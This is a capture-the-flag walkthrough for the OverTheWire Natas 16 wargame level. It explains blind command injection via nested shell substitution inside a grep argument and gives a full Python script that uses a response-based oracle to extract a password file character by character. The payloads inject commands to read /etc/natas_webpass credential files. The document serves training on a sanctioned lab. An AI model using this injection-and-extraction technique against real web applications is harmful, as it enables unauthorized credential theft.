## How the Command Injection Works

The key is **nested command substitution** inside a quoted grep argument.

The server runs:
```bash
grep -i "$key" dictionary.txt
```

When your input is `$(grep a /etc/natas_webpass/natas17)chameleon`, the shell expands it to:
```bash
grep -i "$(grep a /etc/natas_webpass/natas17)chameleon" dictionary.txt
```

**The two-grep logic:**

1. **Inner grep** — `grep a /etc/natas_webpass/natas17` — searches the password file for the letter `a`. It returns the **full password string** if found, or **empty string** if not.
2. The result gets concatenated with `chameleon`, forming the search term for the **outer grep**
3. **Outer grep** searches `dictionary.txt` for that combined string

| Password contains `a`? | Inner result | Outer searches for | dictionary.txt has it? | Output |
|---|---|---|---|---|
| No | `""` | `chameleon` | ✅ Yes | Shows `chameleon...` |
| Yes | `"Xk8s9..."` | `Xk8s9...chameleon` | ❌ No | Blank |

So **blank = letter exists**, **results = letter absent**. Counterintuitive but elegant.

Solution:

```python
import requests  # type:ignore
import string

URL = 'http://natas16.natas.labs.overthewire.org'
AUTH = ('natas16', '...')
ANCHOR = 'chameleon'
PASSWORD_LENGTH = 32

# 1. Check if a chars is in the password --> return TRUE


def query(needle):
    params = {'needle': needle, 'submit': 'Search'}
    response = requests.get(URL, params=params, auth=AUTH)
    return (ANCHOR not in response.text)

# TEST step 1:
# print(query('$(grep e /etc/natas_webpass/natas17)chameleon')) --> FALSE
# print(query('$(grep E /etc/natas_webpass/natas17)chameleon')) --> TRUE

# 2. Find all valid chars:


def valid_chars():
    valid = ''
    for c in string.digits + string.ascii_letters:
        payload = f'$(grep {c} /etc/natas_webpass/natas17){ANCHOR}'
        if query(payload):
            print(f'[+] Valid char: {c}')
            valid += c
    print(f'[*] Valid charactors: {valid}')
    return valid


# TEST step 2:
# valid_chars()
# RESULT:
# [+] Valid char: 0
# ...
# [+] Valid char: T
# [*] Valid charactors: 05789bhjkoqsvwCEFHJLNOT

# 3. Find password string
def find_password(charset):
    password = ''
    for i in range(PASSWORD_LENGTH):
        for c in charset:
            payload = f'$(grep ^{password}{c} /etc/natas_webpass/natas17){ANCHOR}'
            if query(payload):
                password += c
                print(f'[+] Found so far: {password}')
                break
    print(f'[+] Password: {password}')
    return password


# 4. Full run:
charset = valid_chars()
find_password(charset)
```

---

## What each step does

**Step 1 — `query(needle)`**
Sends the payload to the server and returns `True` if the anchor is absent (char exists in password), `False` otherwise.

**Step 2 — `valid_chars()`**
Narrows the search space by finding only characters that actually appear in the password. Reduces requests needed in step 3.

**Step 3 — `find_password(charset)`**
Uses `^` prefix matching to build the password left-to-right, one character per iteration. 32 outer loops × charset size requests at most.

**Step 4 — Full run**
Chains step 2 into step 3.
